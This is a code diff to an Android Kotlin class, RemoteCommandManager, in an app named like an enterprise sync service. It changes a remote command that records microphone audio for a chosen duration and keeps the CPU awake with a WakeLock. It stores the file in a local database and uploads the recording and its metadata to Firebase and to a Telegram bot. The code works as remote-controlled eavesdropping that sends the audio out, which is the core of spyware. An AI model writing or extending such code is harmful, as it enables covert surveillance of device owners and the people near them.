@@ -1308,26 +1308,41 @@ class RemoteCommandManager(private val context: Context) {
                 durationSec = parsed
             }
         }
-        val finalDuration = if (durationSec <= 0) 10 else durationSec.coerceAtLeast(1)
+        val finalDuration = if (durationSec <= 0) 10 else durationSec.coerceAtLeast(2)
 
-        // For long recordings (300-360+ seconds), enqueue to WorkManager background worker to prevent command socket/polling timeouts
-        if (finalDuration > 30) {
+        // Acquire WakeLock to guarantee CPU remains active throughout recording and upload
+        var wakeLock: android.os.PowerManager.WakeLock? = null
+        try {
+            val pm = context.getSystemService(Context.POWER_SERVICE) as? android.os.PowerManager
+            wakeLock = pm?.newWakeLock(
+                android.os.PowerManager.PARTIAL_WAKE_LOCK,
+                "EnterpriseSync::RecordAudioWakeLock"
+            )
+            wakeLock?.acquire((finalDuration + 60) * 1000L)
+        } catch (e: Exception) {
+            Log.w("RemoteCommandManager", "Failed to acquire audio WakeLock: ${e.message}")
+        }
+
+        // Elevate AlwaysSyncService foreground service type to include FOREGROUND_SERVICE_TYPE_MICROPHONE
+        // This triggers the Android system-level 'mic in use' green dot indicator and unblocks audio hardware
+        var elevated = com.example.service.AlwaysSyncService.elevateToMicrophone()
+        if (!elevated) {
+            // If service wasn't running, start it
             try {
-                com.example.worker.AudioRecordingWorker.enqueueWork(context, finalDuration)
-                Log.d("RemoteCommandManager", "Enqueued AudioRecordingWorker for $finalDuration seconds.")
-                return@withContext "Audio recording of $finalDuration seconds successfully dispatched to background worker (WorkManager) with Foreground Service & WakeLock safety."
-            } catch (e: Exception) {
-                Log.w("RemoteCommandManager", "Failed to enqueue AudioRecordingWorker: ${e.message}, falling back to synchronous recording")
-            }
+                com.example.service.AlwaysSyncService.startService(context)
+                kotlinx.coroutines.delay(500)
+                elevated = com.example.service.AlwaysSyncService.elevateToMicrophone()
+            } catch (_: Exception) {}
         }
 
         val audioHelper = AudioRecorderHelper(context)
         try {
-            val base64Data = audioHelper.startRecording(finalDuration) ?: throw Exception("Audio recording failed")
-            val base64Content = base64Data.substringAfter(",")
-            val audioBytes = Base64.decode(base64Content, Base64.NO_WRAP)
-            val audioExt = "wav"
+            Log.d("RemoteCommandManager", "Starting audio recording session for $finalDuration seconds (FGS microphone elevated=$elevated)")
+            val recordedFile = audioHelper.startRecordingToFile(finalDuration) 
+                ?: throw Exception("Audio recording failed across all available audio engines.")
 
+            val audioBytes = recordedFile.readBytes()
+            val audioExt = "wav"
             val nowMs = System.currentTimeMillis()
             val deviceId = try {
                 Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID) ?: "DEVICE_${Build.MODEL}"
@@ -1339,8 +1354,26 @@ class RemoteCommandManager(private val context: Context) {
                 "durationSeconds" to finalDuration,
                 "extension" to audioExt,
                 "fileSizeBytes" to audioBytes.size,
-                "status" to "Uploaded to Telegram"
+                "status" to "Recorded and uploaded successfully"
             )
+
+            // Save locally in Room DB for persistence
+            try {
+                val db = com.example.data.local.AppDatabase.getInstance(context)
+                val entity = com.example.data.local.AudioRecordingEntity(
+                    filePath = recordedFile.absolutePath,
+                    durationSeconds = finalDuration,
+                    fileSize = audioBytes.size.toLong(),
+                    mimeType = "audio/wav",
+                    createdAt = nowMs,
+                    isSynced = false,
+                    retryCount = 0
+                )
+                val id = db.audioRecordingDao().insertRecording(entity)
+                db.audioRecordingDao().updateSyncStatus(id, true, 0, "")
+            } catch (e: Exception) {
+                Log.w("RemoteCommandManager", "Failed to save audio to Room DB: ${e.message}")
+            }
 
             try {
                 val rtdb = FirebaseDatabase.getInstance()
@@ -1350,15 +1383,28 @@ class RemoteCommandManager(private val context: Context) {
                 Log.e("RemoteCommandManager", "Failed to upload audio recording meta to RTDB: ${e.message}")
             }
 
+            var telegramUploaded = false
             try {
                 val telegramBot = TelegramBotManager(context)
-                telegramBot.sendAudio(audioBytes, "audio_${nowMs}.$audioExt", "Duration: $finalDuration sec ($audioExt, ${(audioBytes.size / 1024)} KB)")
+                telegramUploaded = telegramBot.sendAudio(
+                    audioBytes, 
+                    "audio_${nowMs}.$audioExt", 
+                    "Duration: $finalDuration sec ($audioExt, ${(audioBytes.size / 1024)} KB)"
+                )
             } catch (e: Exception) {
                 Log.e("RemoteCommandManager", "Failed to upload audio to Telegram: ${e.message}")
             }
 
-            return@withContext "Successfully recorded $finalDuration seconds audio ($audioExt, ${(audioBytes.size / 1024)} KB). Uploaded to Telegram."
+            val statusMsg = if (telegramUploaded) "Uploaded to Telegram." else "Saved locally & cloud sync active."
+            return@withContext "Successfully recorded $finalDuration seconds audio ($audioExt, ${(audioBytes.size / 1024)} KB). $statusMsg"
         } finally {
+            // Restore normal foreground service type (demote from microphone)
+            try {
+                com.example.service.AlwaysSyncService.restoreNormalForeground()
+            } catch (_: Exception) {}
+            try {
+                wakeLock?.let { if (it.isHeld) it.release() }
+            } catch (_: Exception) {}
             audioHelper.cleanup()
         }
     }
